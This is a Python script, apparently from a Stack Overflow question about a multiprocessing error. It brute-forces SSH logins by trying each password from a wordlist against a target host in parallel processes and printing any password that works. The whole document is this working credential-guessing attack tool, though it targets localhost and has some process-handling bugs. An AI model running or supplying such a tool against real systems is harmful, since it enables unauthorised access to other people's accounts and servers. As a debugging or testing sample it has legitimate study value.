#Source: https://stackoverflow.com/questions/52905353/python-multiprocessing-typeerror-pickling-an-authenticationstring
import paramiko
from multiprocessing import Queue, Process

TARGET_IP = 'localhost'
USERNAME = 'richardcurteis'
WORDLIST = 'test2.txt'
MAX_THREADS = 10
processes = []
found = []
q = Queue()


def ssh_connect(target_ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(target_ip, username=username, password=password)
        found.append(password)
        q.put(password)
    except paramiko.ssh_exception.AuthenticationException:
        print("[*] Failed: ", password)
        return False
    finally:
        ssh.close()

    return True


def close_threads(abort=False):
    for p in processes:
        p.join()
        if abort:
            for x in processes:
                x.terminate()

    processes.clear()


def main():

    with open(WORDLIST) as input_handle:
        process_count = 0
        for line in input_handle:
            try:
                password = line.rstrip()
                p = Process(target=ssh_connect, args=[TARGET_IP, USERNAME, password])
                processes.append(p)
                p.start()
                q.put(p)
                process_count += 1

                if not q.empty():
                    break
                if process_count >= MAX_THREADS:
                    close_threads()
                    process_count = 0

            except KeyboardInterrupt:
                print("[!] Interrupted by user")
                break
            except (ConnectionResetError, paramiko.ssh_exception.SSHException):
                print("[X] Connection reset by target. Reduce thread count")
                break

        close_threads()

        if len(found) > 0:
            for c in found:
                print("[!] Found: ", c)
        else:
            print("[*] Pass not found")


if __name__ == '__main__':
    main()